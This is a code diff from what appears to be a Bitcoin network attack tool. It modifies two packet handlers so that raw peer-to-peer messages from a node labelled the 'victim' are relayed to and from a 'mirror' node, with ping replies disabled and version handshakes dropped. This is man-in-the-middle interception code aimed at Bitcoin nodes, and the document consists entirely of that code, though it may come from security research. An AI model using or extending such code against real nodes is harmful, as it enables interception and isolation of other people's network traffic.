@@ -288,12 +288,16 @@ def packet_received(msg_raw, socket, mirror_socket, from_ip, from_port, to_ip, t
 	msg = MsgSerializable.from_bytes(msg_raw)
 
 	# Relay Bitcoin packets that aren't from the victim
-	print(f'*** Message received ** {from_ip} --> {to_ip} ** {msg_type}')
+	print(f'*** Victim message received ** {from_ip} --> {to_ip} ** {msg_type}')
 	try:
-		if msg_type == 'ping':
-			pong = msg_pong(bitcoin_protocolversion)
-			pong.nonce = msg.nonce
-			socket.send(pong.to_bytes())
+		#if msg_type == 'ping':
+		#	pong = msg_pong(bitcoin_protocolversion)
+		#	pong.nonce = msg.nonce
+		#	socket.send(pong.to_bytes())
+		if msg_type == 'version': pass # Ignore version
+		elif msg_type == 'verack': pass # Ignore version
+		else:
+			mirror_socket.send(msg_raw) # Relay to the mirror
 
 	except Exception as e:
 		close_connection(socket, mirror_socket, from_ip, from_port, interface)
@@ -340,10 +344,14 @@ def mirror_packet_received(msg_raw, socket, orig_socket, from_ip, from_port, to_
 	# Relay Bitcoin packets that aren't from the victim
 	print(f'*** Mirror message received ** {from_ip} --> {to_ip} ** {msg_type}')
 	try:
-		if msg_type == 'ping':
-			pong = msg_pong(bitcoin_protocolversion)
-			pong.nonce = msg.nonce
-			socket.send(pong.to_bytes())
+		#if msg_type == 'ping':
+		#	pong = msg_pong(bitcoin_protocolversion)
+		#	pong.nonce = msg.nonce
+		#	socket.send(pong.to_bytes())
+		if msg_type == 'version': pass # Ignore version
+		elif msg_type == 'verack': pass # Ignore version
+		else:
+			orig_socket.send(msg_raw) # Relay to the victim
 
 	except Exception as e:	
 		print("Closing socket because of error: " + str(e))
